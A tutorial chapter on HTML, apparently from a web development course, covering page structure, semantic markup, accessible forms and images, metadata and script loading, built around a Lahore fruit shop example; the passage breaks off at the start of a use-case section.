# HTML: The Structure of a Web Page

> [!GOALS]
> - Explain what HTML is, what a browser does with it, and why structure and **meaning** matter more than appearance.
> - Write a complete, valid HTML document: doctype, `<html lang>`, `<head>` with the essential metadata, and `<body>`.
> - Use elements, attributes and nesting correctly, and understand how the browser turns HTML into a tree called the DOM.
> - Mark up text, links, images, lists and tables using the right **semantic** elements.
> - Structure a page with landmarks — `header`, `nav`, `main`, `article`, `section`, `aside`, `footer` — and a sensible heading outline.
> - Build forms that work for everyone: labels, input types, built-in validation, and how submitted data reaches a server.
> - Apply the first rules of accessibility and security that start in HTML: alternative text, real buttons, escaping user content.
> - Load scripts, styles and images in ways that keep pages fast.

## Why this matters

Every web page you have ever visited — a shop, a bank, a search engine, a social network — reaches your browser first as a text document written in **HTML**. CSS makes it look good, and JavaScript makes it interactive, but HTML is the **foundation**: it says what is on the page and what each part **means**.

It is tempting to treat HTML as easy — "it's just tags" — and to move quickly to frameworks. Many developers do exactly that, and their mistakes show up everywhere:

- A "button" built from a `<div>` that cannot be reached with the keyboard, so customers who cannot use a mouse cannot check out.
- A form whose fields have no labels, so screen-reader users hear "edit text, edit text, edit text" and cannot tell which field is the card number.
- A page whose only heading is an image, so search engines barely understand what it is about.
- A product image with no dimensions, so the whole page jumps as it loads, and the customer taps the wrong button.
- A comment box that inserts what users type straight into the page, letting an attacker run their own JavaScript in other customers' browsers.

None of these needs advanced knowledge to avoid — only correct HTML. Even if you mainly work on the back-end, you will render HTML from servers ({{ch:express}}), send it in emails ({{ch:email}}), review front-end pull requests and debug pages in the browser. And every front-end framework you will learn, including React ({{ch:react-basics}}), ultimately produces HTML elements. Knowing what those elements mean is what separates a professional front-end from one that merely looks right.

## The simple idea

Think of a newspaper page. Before anyone chooses fonts or colours, an editor decides its **structure**: this is the main headline, this is a smaller headline, this is a paragraph, this is a photo with a caption, this is a list of sports results, this is an advertisement in the side column. Readers rely on that structure without thinking about it: the biggest headline is the most important story.

HTML is how you tell the browser the structure and meaning of a page: "this is the main heading", "this is a paragraph", "this is a link to another page", "this is a list", "this is the navigation". The browser — and search engines, and screen readers used by blind people — use that information to display, understand and navigate the page.

> [!ANALOGY]
> HTML is like an editor marking up a newspaper page: "headline here, paragraph here, photo with caption here" — structure and meaning, before any decisions about appearance.
>
> **Where the analogy breaks:** a newspaper reader only *sees* the page. An HTML page is also read by **programs**: screen readers speak it aloud, search engines index it, browsers make links clickable and forms submittable, and JavaScript changes it while you watch. The "markup" is not just a note for a designer — it changes what the page can *do*.

## The proper definition and key words

**HTML** (HyperText Markup Language) is the standard **markup language** for documents displayed in web browsers. A markup language annotates text with **tags** that describe its structure and meaning; it is not a programming language — it has no variables, loops or logic.

"HyperText" means text containing **links** to other text — the idea, proposed by Tim Berners-Lee at CERN in 1989–1991, that created the World Wide Web ({{ch:how-the-web-works}}). Today, HTML is maintained as a **living standard** by the WHATWG (Web Hypertext Application Technology Working Group), a group formed by browser makers. It is updated continuously rather than in numbered versions; "HTML5" is the name of the big modernisation of the late 2000s and is still used informally.

The key words:

- **Element** — one component of a page, such as a paragraph or a link. Most elements are written as an **opening tag**, content, and a **closing tag**: `<p>Hello</p>`.
- **Tag** — the markup in angle brackets: `<p>` opens a paragraph element, `</p>` closes it.
- **Attribute** — extra information on an opening tag, written `name="value"`: `<a href="/cart">`.
- **Void element** — an element with no content and no closing tag, such as `<img>`, `<input>`, `<br>` and `<meta>`.
- **Nesting** — elements placed inside other elements, forming a hierarchy.
- **Semantic element** — an element that describes the **meaning** of its content (`<nav>`, `<article>`, `<button>`), as opposed to a generic container (`<div>`, `<span>`).
- **DOM** (Document Object Model) — the tree of objects the browser builds from HTML, which JavaScript can read and change ({{ch:browser-and-dom}}).
- **Accessibility** — making pages usable by everyone, including people with disabilities who use assistive technology ({{ch:accessibility}}).

## How it works inside: from text to page

When you open a page, the browser receives the HTML as plain text over HTTP ({{ch:how-the-web-works}}). It then:

1. **Parses** the text: reads it character by character, recognising tags and text.
2. **Builds the DOM**: a tree of nodes — one for each element and piece of text.
3. **Fetches other resources** the HTML refers to: stylesheets, scripts, images, fonts.
4. **Combines the DOM with CSS** to work out what is visible and how it looks, calculates the **layout** (where everything goes), and **paints** pixels on the screen.
5. **Runs JavaScript**, which may change the DOM — and the browser updates the screen.

Consider this small document:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Corner Shop</title>
  </head>
  <body>
    <h1>Fresh mangoes</h1>
    <p>Sindhri mangoes, <strong>Rs 450</strong> per kg.</p>
  </body>
</html>
```

The browser builds this tree:

```text
  Document
  └── html (lang="en")
      ├── head
      │   └── title
      │       └── "Corner Shop"
      └── body
          ├── h1
          │   └── "Fresh mangoes"
          └── p
              ├── "Sindhri mangoes, "
              ├── strong
              │   └── "Rs 450"
              └── " per kg."
```

Notice:

- Every element becomes a **node**; text becomes **text nodes**. The `<p>` element has three children: a text node, a `<strong>` element, and another text node.
- Nesting in the HTML becomes parent–child relationships in the tree. This is why nesting must be correct: `<p><strong>Rs 450</p></strong>` describes something that is not a tree.
- The `title` is not shown in the page; it appears in the browser tab, bookmarks and search results.

> [!INSIDE]
> HTML parsing is **error-tolerant** by design. If you forget a closing tag or nest elements wrongly, the browser does not stop with an error, as a compiler would. The HTML standard specifies exactly how to recover from every kind of mistake, so all browsers build the same tree from the same broken HTML. The downside: mistakes are **silent**. The page may look fine while the DOM is not what you intended — which then breaks your CSS, your JavaScript or a screen reader. Use the browser's developer tools (Elements panel) to see the tree the browser actually built, and an HTML validator to catch mistakes.

## The structure of a document

### Level 3 — The minimal complete page

Every HTML page should start from this skeleton:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Fresh Mangoes — Corner Shop</title>
    <meta name="description" content="Order Sindhri and Chaunsa mangoes from Corner Shop in Lahore, delivered the same day.">
    <link rel="stylesheet" href="/styles.css">
    <script src="/app.js" defer></script>
  </head>
  <body>
    <!-- visible content goes here -->
  </body>
</html>
```

Line by line:

- `<!DOCTYPE html>` tells the browser to use **standards mode**. Without it, browsers switch to "quirks mode", imitating the buggy behaviour of 1990s browsers for old pages — and your CSS will behave strangely. It is not an element, just a required declaration.
- `<html lang="en">` is the **root element**. The `lang` attribute declares the page's language. Screen readers use it to choose pronunciation; browsers use it for translation offers, hyphenation and spell-checking. For an Urdu page you would write `lang="ur"` (and `dir="rtl"` for right-to-left text).
- `<head>` contains **metadata** — information about the page, mostly not displayed.
- `<meta charset="utf-8">` declares the **character encoding**: how the bytes of the file map to characters. UTF-8 can represent every character in every language, including Urdu, emoji and the rupee sign. It should be the first thing in `<head>`, because the browser must know the encoding before it reads further text ({{ch:what-a-computer-is}}).
- `<meta name="viewport" ...>` makes the page display properly on phones. Without it, mobile browsers pretend the screen is about 980 pixels wide and shrink the page, so text becomes tiny. `width=device-width` says "use the device's real width"; `initial-scale=1` says "do not zoom at first". You will see why this matters in responsive design ({{ch:css}}).
- `<title>` is shown in the tab and is the clickable headline in search results. Make it specific: what this page is, then the site name.
- `<meta name="description">` is a summary that search engines often display under the title ({{ch:seo}}).
- `<link rel="stylesheet" href="...">` loads a CSS file.
- `<script src="..." defer>` loads JavaScript. `defer` matters — it is explained in the performance section below.
- `<body>` contains everything visible.
- `<!-- ... -->` is an **HTML comment**. Browsers ignore it — but comments are sent to every visitor and visible with "View source", so never put secrets or internal notes in them.

### Level 2 — Elements, attributes and nesting rules

Some rules worth knowing exactly:

- **Tag names are not case-sensitive**, but lowercase is the universal convention.
- **Attribute values** should be quoted: `class="price"`. Double quotes are conventional.
- **Boolean attributes** are true by being present: `<input required>` and `<input disabled>`. Writing `disabled="false"` still disables the input — the attribute is present.
- **Void elements** have no closing tag: `<img>`, `<input>`, `<br>`, `<hr>`, `<meta>`, `<link>`. You may see `<img />` with a slash; in HTML the slash is allowed but has no effect (it comes from XHTML and JSX).
- **Close what you open, in reverse order**: `<p><em>very</em> fresh</p>`.
- **Some elements may not contain others.** A `<p>` cannot contain block-level structure such as another `<p>`, a list or a `<div>` — the browser will close the paragraph early. Interactive elements cannot be nested: no `<a>` inside an `<a>`, no `<button>` inside a `<button>`.
- **IDs must be unique** in a page. `id="checkout-form"` may appear once. `class` values may be shared by many elements and are used for styling ({{ch:css}}).
- **Whitespace collapses.** Several spaces, tabs and line breaks in text are displayed as a single space. Use elements (paragraphs, lists), not extra spaces, for layout.

### Level 2 — Block and inline

By default, elements fall into two broad display groups (CSS can change both):

- **Block-level** elements — `<p>`, `<h1>`–`<h6>`, `<ul>`, `<div>`, `<section>` — start on a new line and take the full available width.
- **Inline** elements — `<a>`, `<strong>`, `<em>`, `<span>`, `<img>` — flow within a line of text.

`<div>` (block) and `<span>` (inline) are **generic containers** with no meaning at all. They are useful for styling and layout when no meaningful element fits — but they should be your last choice, not your first.

## Text content

### Headings

HTML has six heading levels, `<h1>` to `<h6>`. They create the **outline** of the page, like chapter and section titles in a book:

```html
<h1>Mangoes</h1>
  <h2>Varieties</h2>
    <h3>Sindhri</h3>
    <h3>Chaunsa</h3>
  <h2>Delivery</h2>
```

(Indentation here only shows the levels; it has no effect.)

Rules that matter:

- **One `<h1>` per page**, describing what the page is about, is the clear convention.
- **Do not skip levels** going down (an `<h4>` directly under an `<h2>`). Screen-reader users commonly navigate by headings — jumping from heading to heading to skim a page — and a broken outline makes the page confusing.
- **Choose headings by meaning, not size.** If you want large text that is not a heading, use CSS. If something is a heading, use a heading element even if the design shows it small.

### Paragraphs, emphasis and other text elements

```html
<p>
  Our mangoes are picked <em>ripe</em>, not early.
  <strong>Orders after 6 p.m. are delivered the next morning.</strong>
</p>
<p>Use code <code>MANGO10</code> for 10% off. Press <kbd>Enter</kbd> to apply it.</p>
<p>Prices updated <time datetime="2026-06-15">15 June 2026</time>.</p>
<blockquote cite="https://example.com/reviews/1032">
  <p>The best Chaunsa I have bought in Lahore.</p>
</blockquote>
```

- `<p>` — a paragraph.
- `<em>` — **stress emphasis**, the kind that changes meaning when spoken. Displayed in italics by default.
- `<strong>` — **strong importance**, seriousness or urgency. Displayed in bold by default.
- `<b>` and `<i>` still exist, for text that is stylistically different without extra importance — a product name, a term in another language. If you only want bold or italic **appearance**, use CSS.
- `<code>` — a fragment of computer code; `<kbd>` — keyboard input.
- `<time datetime="...">` — a date or time with a machine-readable value. Browsers, search engines and scripts can read `2026-06-15` regardless of how the visible text is written.
- `<blockquote>` — a quotation from another source; `cite` can give the source URL.
- `<br>` — a line break **within** text where breaks are meaningful, such as an address or a poem. Never use repeated `<br>` elements to create spacing — that is CSS's job.

### Lists

```html
<h2>Why buy from us</h2>
<ul>
  <li>Same-day delivery in Lahore</li>
  <li>Cash on delivery</li>
  <li>Free returns on damaged fruit</li>
</ul>

<h2>How to order</h2>
<ol>
  <li>Choose your mangoes and the box size.</li>
  <li>Enter your address.</li>
  <li>Pay online or choose cash on delivery.</li>
</ol>

<h2>Box sizes</h2>
<dl>
  <dt>Small</dt>
  <dd>5 kg, about 15–18 mangoes</dd>
  <dt>Large</dt>
  <dd>10 kg, about 30–36 mangoes</dd>
</dl>
```

- `<ul>` (unordered list) — items where order does not matter.
- `<ol>` (ordered list) — steps or rankings where order matters. Numbers are added automatically.
- `<li>` — a list item. **Only** `<li>` elements may be direct children of `<ul>` and `<ol>`.
- `<dl>`, `<dt>`, `<dd>` — a **description list**: terms and their descriptions (glossaries, specifications, key–value details).

Navigation menus are lists of links, so they are usually marked up as `<ul>` inside `<nav>`. Screen readers announce "list, 5 items", which helps users understand the menu's size.

## Links

The **anchor** element `<a>` creates a link — the "hyper" in HyperText:

```html
<a href="https://www.example.org/mango-season">Mango season guide</a>
<a href="/cart">View your cart</a>
<a href="../faq.html">FAQ</a>
<a href="#delivery">Jump to delivery information</a>
<a href="mailto:orders@cornershop.example">Email us</a>
<a href="tel:+924235761234">Call the shop</a>
<a href="/invoices/1032.pdf" download>Download your invoice</a>
```

The `href` ("hypertext reference") can be:

- An **absolute URL** — the full address, including the scheme: `https://...`.
- A **root-relative URL**, starting with `/` — relative to the site's root: `/cart` on `cornershop.example` means `https://cornershop.example/cart`.
- A **relative URL** — relative to the current page's location: `../faq.html` means "one folder up, then `faq.html`".
- A **fragment**, starting with `#` — a position on the current page: `#delivery` scrolls to the element with `id="delivery"`.
- Special schemes: `mailto:` opens the email program, `tel:` starts a phone call on mobiles.
- The `download` attribute asks the browser to download the file rather than open it.

### Opening links in a new tab

```html
<a href="https://partner.example/offer" target="_blank" rel="noopener">Partner offer</a>
```

`target="_blank"` opens a new tab. Historically, this let the new page access the original page through `window.opener` and redirect it — for example, to a fake login page (an attack known as "reverse tabnabbing"). `rel="noopener"` prevents that. Modern browsers now apply `noopener` by default for `target="_blank"`, but writing it explicitly is still common and harmless. Use new tabs sparingly: it takes control away from the user, who can always open a new tab themselves.

### Link text

Link text should make sense **on its own**. Screen-reader users often bring up a list of all links on a page. A list of "click here, click here, read more, click here" is useless; "Delivery areas", "Return policy" and "Track your order" are clear. The same text helps search engines understand what the linked page is about ({{ch:seo}}).

### Links versus buttons

This distinction is one of the most important in front-end development:

- A **link** (`<a href>`) **navigates** — to another page, a file, or a place on the page.
- A **button** (`<button>`) **performs an action** — submits a form, opens a menu, adds to cart, deletes an item.

Browsers, keyboards and assistive technology treat them differently: links are activated with Enter, buttons with Enter or Space; links appear in the links list, buttons do not; middle-clicking a link opens a new tab. Making a link look like a button with CSS is fine; making a link **behave** like a button (with JavaScript on `href="#"`) is not.

## Images and media

### Level 3 — The `img` element

```html
<img
  src="/images/sindhri-box.jpg"
  alt="A wooden box of twelve ripe yellow Sindhri mangoes"
  width="800"
  height="600"
  loading="lazy">
```

- `src` — the image file's URL.
- `alt` — **alternative text**: what the image conveys, for people who cannot see it (screen-reader users, people with images turned off, slow connections where the image fails to load) and for search engines. It is required.
- `width` and `height` — the image's **intrinsic** size in pixels. Even if CSS later resizes the image, these let the browser reserve the right amount of space **before** the image downloads, so the page does not jump when it arrives. This jumping is measured as **Cumulative Layout Shift**, one of Google's Core Web Vitals ({{ch:frontend-performance}}).
- `loading="lazy"` — the browser delays downloading the image until the user scrolls near it, saving data and speeding up the initial load. Do **not** lazy-load the main image at the top of the page; it should load immediately.

### Writing good alternative text

- Describe the **purpose** of the image in context, briefly. For a product photo: what the product looks like. For a chart: the key finding ("Sales doubled between March and June").
- Do not start with "Image of" — screen readers already announce it as an image.
- If an image is **purely decorative** (a background flourish), use an empty alt: `alt=""`. That tells screen readers to skip it. Omitting `alt` entirely is different and worse: screen readers may read out the file name ("IMG underscore 4032 dot jpeg").
- If an image is a **link** or **button** with no text, the alt text must describe the action or destination ("Corner Shop home page"), not the picture.

### Responsive images

Phones do not need a 2,400-pixel-wide image. `srcset` and `sizes` let the browser choose the best file:

```html
<img
  src="/images/mangoes-800.jpg"
  srcset="/images/mangoes-400.jpg 400w,
          /images/mangoes-800.jpg 800w,
          /images/mangoes-1600.jpg 1600w"
  sizes="(max-width: 600px) 100vw, 600px"
  alt="Sliced Chaunsa mango on a white plate"
  width="800" height="533">
```

- `srcset` lists available files and their real widths (`400w` means 400 pixels wide).
- `sizes` tells the browser how wide the image will be displayed: on screens up to 600 pixels wide, the full viewport width (`100vw`); otherwise, 600 pixels.
- The browser combines this with the screen's pixel density and picks the smallest file that will look sharp. A phone might download the 400- or 800-pixel file instead of the 1,600-pixel one — often a large saving.

The `<picture>` element goes further, letting you offer modern formats (such as AVIF and WebP, which are smaller than JPEG for similar quality) with a fallback:

```html
<picture>
  <source srcset="/images/mangoes.avif" type="image/avif">
  <source srcset="/images/mangoes.webp" type="image/webp">
  <img src="/images/mangoes.jpg" alt="Sliced Chaunsa mango on a white plate" width="800" height="533">
</picture>
```

The browser uses the first `<source>` whose format it supports; the `<img>` is the fallback and still carries the `alt` text and dimensions.

### Figures, video and audio

```html
<figure>
  <img src="/images/delivery-map.png" alt="Map of Lahore with same-day delivery areas shaded green" width="900" height="600">
  <figcaption>Same-day delivery covers these areas of Lahore.</figcaption>
</figure>

<video controls width="640" height="360" poster="/media/farm-poster.jpg">
  <source src="/media/farm-tour.webm" type="video/webm">
  <source src="/media/farm-tour.mp4" type="video/mp4">
  <track kind="captions" src="/media/farm-tour.en.vtt" srclang="en" label="English">
  Your browser cannot play this video. <a href="/media/farm-tour.mp4">Download it instead.</a>
</video>
```

- `<figure>` groups self-contained content (an image, diagram or code sample) with an optional `<figcaption>`.
- `<video controls>` shows the browser's play/pause and volume controls. `poster` is an image shown before playback. Several `<source>` elements offer formats in order of preference.
- `<track kind="captions">` adds captions — essential for deaf and hard-of-hearing users, and for anyone watching without sound.
- Text inside `<video>` is shown only by browsers that cannot play video.
- Avoid **autoplay** with sound: it is disruptive, and browsers block it.

## Semantic page structure

### Level 2 — Landmarks

For many years, pages were built entirely from `<div>` elements with class names: `<div class="header">`, `<div class="nav">`, `<div id="main">`. HTML5 introduced elements with those **meanings** built in:

```html
<body>
  <a class="skip-link" href="#main">Skip to main content</a>

  <header>
    <a href="/"><img src="/logo.svg" alt="Corner Shop home" width="120" height="40"></a>
    <nav aria-label="Main">
      <ul>
        <li><a href="/fruit" aria-current="page">Fruit</a></li>
        <li><a href="/vegetables">Vegetables</a></li>
        <li><a href="/cart">Cart (2)</a></li>
      </ul>
    </nav>
  </header>

  <main id="main">
    <h1>Fruit</h1>

    <section aria-labelledby="mango-heading">
      <h2 id="mango-heading">Mangoes</h2>
      <article>
        <h3>Sindhri</h3>
        <p>Sweet, large and fibre-free.</p>
      </article>
      <article>
        <h3>Chaunsa</h3>
        <p>Rich and aromatic; the late-season favourite.</p>
      </article>
    </section>

    <aside>
      <h2>Mango tips</h2>
      <p>Keep unripe mangoes at room temperature, not in the fridge.</p>
    </aside>
  </main>

  <footer>
    <p>&copy; Corner Shop, Lahore</p>
    <nav aria-label="Footer">
      <ul>
        <li><a href="/privacy">Privacy</a></li>
        <li><a href="/contact">Contact</a></li>
      </ul>
    </nav>
  </footer>
</body>
```

What each element means:

- `<header>` — introductory content for the page (or for a section or article): logo, site name, main navigation.
- `<nav>` — a block of **major** navigation links. Not every group of links needs `<nav>`; use it for primary site navigation, footer navigation, breadcrumbs, and tables of contents. When there are several, `aria-label` names each one ("Main", "Footer") so screen-reader users can tell them apart.
- `<main>` — the **main content** of the page: the part that is unique to this page. Use exactly one visible `<main>` per page.
- `<section>` — a thematic grouping of content, usually with its own heading. If you cannot think of a heading for it, it is probably a `<div>`.
- `<article>` — a **self-contained** piece that would make sense on its own or syndicated elsewhere: a blog post, a news story, a product card, a comment.
- `<aside>` — content tangentially related to what surrounds it: sidebars, related links, tips, advertisements.
- `<footer>` — closing content for the page (or section): copyright, contact links, secondary navigation.
- `aria-current="page"` marks the link for the page you are on, so screen readers announce "current page".
- `&copy;` is a **character reference** that produces ©. (More on these under Security.)

### Level 2 — Why semantics matter

The page looks identical whether it uses these elements or plain `<div>`s. So why bother?

- **Assistive technology.** Screen readers expose these elements as **landmarks**. A blind user can press a key to jump straight to `main`, skip the navigation, or list all landmarks — the equivalent of a sighted user glancing at the page layout. With only `<div>`s, the page is one long undifferentiated stream.
- **Keyboard and browser features.** Reader modes, translation tools and browser extensions use semantic structure to find the main content.
- **Search engines** understand the page better ({{ch:seo}}).
- **Developers** understand it better. `<nav>` explains itself; `<div class="x7f">` does not.
- **Less code.** Native elements come with built-in behaviour you do not have to rebuild.

### The skip link

The first link in the body example, "Skip to main content", is a **skip link**. Keyboard users move through a page with the Tab key, link by link. Without a skip link, they must tab through the whole header and navigation on **every** page before reaching the content. The skip link, usually hidden with CSS until it receives keyboard focus, lets them jump straight to `<main id="main">`. It is a small detail with a large effect for people who depend on it.

## Tables

Tables are for **tabular data** — information with rows and columns, like a price list or an order history. (In the early web, tables were also used for page layout. Never do this today; it is inaccessible and inflexible. CSS layout replaced it — {{ch:css}}.)

```html
<table>
  <caption>Mango prices this week</caption>
  <thead>
    <tr>
      <th scope="col">Variety</th>
      <th scope="col">Price per kg</th>
      <th scope="col">In stock</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">Sindhri</th>
      <td>Rs 450</td>
      <td>Yes</td>
    </tr>
    <tr>
      <th scope="row">Chaunsa</th>
      <td>Rs 520</td>
      <td>Only 12 boxes</td>
    </tr>
  </tbody>
</table>
```

- `<caption>` — the table's title, read first by screen readers.
- `<thead>`, `<tbody>` (and optionally `<tfoot>`) — group the header rows, body rows and footer rows.
- `<tr>` — a table row.
- `<th>` — a **header cell**; `<td>` — a data cell.
- `scope="col"` and `scope="row"` say whether a header labels its column or its row. This lets a screen reader announce, for the cell "Rs 520", "Chaunsa, Price per kg, Rs 520" — instead of a meaningless stream of values.

Wide tables on phones are a real design problem; a common solution is to let the table scroll horizontally inside a container, rather than squeezing the columns.

## Forms

Forms are how users send information: logging in, searching, checking out, filing a complaint. They are where HTML most directly affects whether a business makes money — and where accessibility mistakes most directly lock people out.

### Level 3 — A complete form

```html
<form action="/orders" method="post">
  <fieldset>
    <legend>Delivery details</legend>

    <label for="name">Full name</label>
    <input id="name" name="name" type="text" autocomplete="name" required>

    <label for="phone">Mobile number</label>
    <input id="phone" name="phone" type="tel" autocomplete="tel"
           inputmode="tel" pattern="(\+92|0)3[0-9]{9}" required
           aria-describedby="phone-hint">
    <p id="phone-hint">Format: 03001234567 or +923001234567</p>

    <label for="city">City</label>
    <select id="city" name="city" required>
      <option value="">Choose a city</option>
      <option value="lahore">Lahore</option>
      <option value="karachi">Karachi</option>
      <option value="islamabad">Islamabad</option>
    </select>

    <label for="address">Street address</label>
    <textarea id="address" name="address" rows="3" autocomplete="street-address" required></textarea>
  </fieldset>

  <fieldset>
    <legend>Box size</legend>
    <input type="radio" id="size-small" name="size" value="5" checked>
    <label for="size-small">Small (5 kg)</label>
    <input type="radio" id="size-large" name="size" value="10">
    <label for="size-large">Large (10 kg)</label>
  </fieldset>

  <label for="qty">Number of boxes</label>
  <input id="qty" name="quantity" type="number" min="1" max="10" value="1" required>

  <input type="checkbox" id="gift" name="gift" value="yes">
  <label for="gift">This is a gift (no prices on the packing slip)</label>

  <button type="submit">Place order</button>
</form>
```

Walk through the important parts:

- `<form action="/orders" method="post">` — when submitted, the browser sends the data to the URL `/orders` using the HTTP method POST ({{ch:how-the-web-works}}).
- **`<label for="id">`** connects a label to the input with that `id`. This does three things: screen readers read the label when the input is focused ("Full name, edit text, required"); clicking the label focuses the input (a bigger target, which helps everyone, especially on phones); and the relationship is explicit for tools and tests. **Every input needs a label.** A placeholder is not a label — it disappears when the user starts typing, has low contrast, and is not reliably announced.
- **`name`** is the key under which the value is sent to the server. An input without a `name` is **not submitted at all** — a classic bug.
- **`type`** changes behaviour, not just appearance: `type="email"` checks for an email shape and shows an `@` key on phone keyboards; `type="tel"` shows a number pad; `type="number"` shows steppers and rejects letters; `type="date"` shows a date picker; `type="password"` hides characters; `type="search"` adds a clear button.
- **`autocomplete`** tells the browser what the field contains (`name`, `tel`, `email`, `street-address`, `current-password`, `new-password`, `one-time-code` and many more), so it can fill it in from saved details. This speeds up checkout dramatically on phones and helps people with motor or memory difficulties.
- **`inputmode`** hints which on-screen keyboard to show, independently of the type.
- **`required`**, **`min`**, **`max`**, **`pattern`** — built-in validation rules, explained below.
- **`aria-describedby="phone-hint"`** links the input to its hint text, so screen readers read the hint after the label.
- **`<fieldset>` and `<legend>`** group related fields with a caption. For radio buttons, this is essential: without the legend "Box size", a screen reader would announce just "Small (5 kg), radio button", without saying what the choice is about.
- **Radio buttons with the same `name`** form a group: only one can be selected, and the selected one's `value` is submitted (`size=5`).
- `<select>` gives a list of options; the empty first option with `required` forces a real choice.
- A **checkbox** is submitted only when checked; then it sends its `value` (`gift=yes`). Unchecked, it sends nothing.
- **`<button type="submit">`** submits the form. The type matters: inside a form, a `<button>` without a `type` defaults to `submit`, so a "Show password" button without `type="button"` will submit the form by accident.

### Level 2 — What actually gets sent

When the user presses "Place order", the browser collects every **successful control** — inputs with a `name` that are not disabled (and checkboxes and radios only if checked) — and encodes them. For `method="post"` with the default encoding, the request body looks like:

```text
name=Ayesha+Khan&phone=03001234567&city=lahore&address=12+Canal+View&size=10&quantity=2&gift=yes
```

- Each control becomes `name=value`, joined with `&`.
- Spaces become `+`, and special characters are **percent-encoded** (for example, `@` becomes `%40`). This format is called `application/x-www-form-urlencoded`.
- With `method="get"`, the same string is appended to the URL after a `?`: `/search?q=mango&sort=price`. Use GET for **searches and filters** — the results can be bookmarked and shared — and POST for anything that **changes data** (orders, sign-ups, payments) or contains sensitive values, which should never appear in URLs (URLs are stored in history, logs and analytics).
- For file uploads, the form needs `method="post"` and `enctype="multipart/form-data"` ({{ch:file-uploads}}).

On the server, a framework parses this body into an object you can use ({{ch:express}}). In modern applications, JavaScript often intercepts submission and sends JSON instead ({{ch:forms}}) — but the HTML form, its labels and its validation remain the foundation.

### Level 3 — Built-in validation

Browsers validate forms before submitting them, using the attributes:

| Attribute | Rule |
|---|---|
| `required` | Must not be empty |
| `type="email"`, `type="url"` | Must look like an email address or URL |
| `min`, `max`, `step` | Numeric and date ranges and increments |
| `minlength`, `maxlength` | Text length limits |
| `pattern` | Must match a regular expression (the whole value) |

If a rule fails, the browser blocks submission, focuses the first invalid field and shows a message. CSS can style fields with the `:invalid` and `:user-invalid` pseudo-classes, and JavaScript can customise messages with the Constraint Validation API.

> [!WARNING]
> **Browser validation is a convenience for users, never a security measure.** Anyone can turn it off, edit the HTML in developer tools, or send a request directly with a tool like `curl` — skipping your page entirely. The **server must validate every field again**, every time ({{ch:validation}}). Treat client-side validation as helpful hints; treat server-side validation as the law.

### Buttons and interactive elements

The rule from the links section applies everywhere: **if it does something, use a `<button>`**:

```html
<!-- Wrong: looks like a button, but isn't one -->
<div class="btn" onclick="addToCart()">Add to cart</div>

<!-- Right -->
<button type="button" class="btn" onclick="addToCart()">Add to cart</button>
```

The `<div>` version cannot receive keyboard focus with Tab, does not respond to Enter or Space, is not announced as a button by screen readers, and is not disabled by `disabled`. To fix it, you would have to add `tabindex`, `role="button"`, key handlers and more — rebuilding badly what `<button>` provides for free. (Inline `onclick` attributes appear here only for brevity; in real code, attach handlers in JavaScript — {{ch:browser-and-dom}}.)

Modern HTML also includes interactive elements that need no JavaScript:

```html
<details>
  <summary>Delivery and returns</summary>
  <p>Same-day delivery in Lahore for orders before 6 p.m. Damaged fruit is refunded in full.</p>
</details>

<dialog id="confirm-dialog">
  <p>Remove this item from your cart?</p>
  <form method="dialog">
    <button value="cancel">Keep it</button>
    <button value="remove">Remove</button>
  </form>
</dialog>
```

- `<details>` and `<summary>` create an accessible disclosure widget — an expandable section — with keyboard support built in.
- `<dialog>` is a native modal dialog. Opened with JavaScript's `showModal()`, it traps focus inside itself, closes with the Escape key and makes the rest of the page inert — behaviours that are hard to build correctly by hand. A form with `method="dialog"` closes the dialog and reports which button was pressed.

## Metadata for sharing and search

Beyond `title` and `description`, a few `<head>` elements matter for real sites:

```html
<link rel="icon" href="/favicon.ico" sizes="32x32">
<link rel="icon" href="/icon.svg" type="image/svg+xml">
<link rel="canonical" href="https://cornershop.example/fruit/mangoes">

<meta property="og:title" content="Fresh Sindhri mangoes — Corner Shop">
<meta property="og:description" content="Same-day delivery in Lahore.">
<meta property="og:image" content="https://cornershop.example/images/og-mangoes.jpg">
<meta property="og:type" content="website">
```

- **Favicons** are the small icons in tabs and bookmarks.
- The **canonical** link tells search engines which URL is the official one when the same content is reachable at several URLs (for example, with tracking parameters).
- **Open Graph** tags (the `og:` properties, originally defined by Facebook and now widely used) control the title, description and image shown when the page is shared in messaging apps and social networks.

You will learn how search engines use these, plus structured data, in {{ch:seo}}.

## Loading scripts and styles

Where and how you load resources has a large effect on how fast a page appears.

### Scripts: `defer`, `async` and modules

By default, when the parser meets `<script src="app.js">`, it **stops**: it downloads the script, runs it, and only then continues building the DOM. A slow script in the `<head>` therefore delays the whole page — a **render-blocking** script.

```text
  plain script:  parse ──▶ [stop: download + run script] ──▶ parse more
  defer:         parse ─────────────────────────────▶ DOM ready ──▶ run script
                   └── download in parallel ──┘
  async:         parse ────▶ [pause: run as soon as downloaded] ──▶ parse more
                   └── download in parallel ──┘
```

- **`defer`**: download in parallel, run **after** the document is parsed, in the order the scripts appear. The right default for most application scripts.
- **`async`**: download in parallel, run **as soon as** it arrives, in any order. Suits independent scripts such as analytics.
- **`type="module"`**: loads an ES module ({{ch:modules-and-npm}}); modules are deferred by default.

The old advice was "put scripts at the end of `<body>`". With `defer`, you can keep them in the `<head>`, where the browser discovers them early and starts downloading sooner.

### Styles

Stylesheets are also render-blocking — deliberately: the browser waits for CSS so that it does not show unstyled content and then jump. Keep CSS small, load it early in the `<head>`, and avoid loading CSS that the page does not need. You will learn more techniques, including preloading critical resources, in {{ch:frontend-performance}}.

## From beginner to enterprise

**Level 3 — a single page.** A valid skeleton; one `h1` and a logical heading outline; semantic text elements; labelled form fields; alt text; real buttons and links.

**Level 4 — a real website.** Landmarks and a skip link; responsive images with dimensions; forms with `autocomplete` and server-side validation; Open Graph and canonical metadata; deferred scripts. Templates or components generate the HTML, so structure is consistent across hundreds of pages.

**Level 5 — professional practice.** HTML validation and automated accessibility checks in CI (tools such as axe can run inside tests); a design system whose components are built on correct native elements; code reviews that check semantics, not just appearance; manual testing with a keyboard and a screen reader for key journeys.

**Level 6 — large organisations.** Shared component libraries used by many teams, so one accessible implementation of "button", "dialog" or "data table" serves the whole company; legal accessibility requirements in many countries (for example, laws based on the international WCAG guidelines); performance budgets monitored on real users' devices; HTML generated on the server or at the edge for speed and search visibility ({{ch:nextjs}}).

## Real-world use cases

### A checkout form that converts

- **Business problem:** many customers abandon checkout on phones.
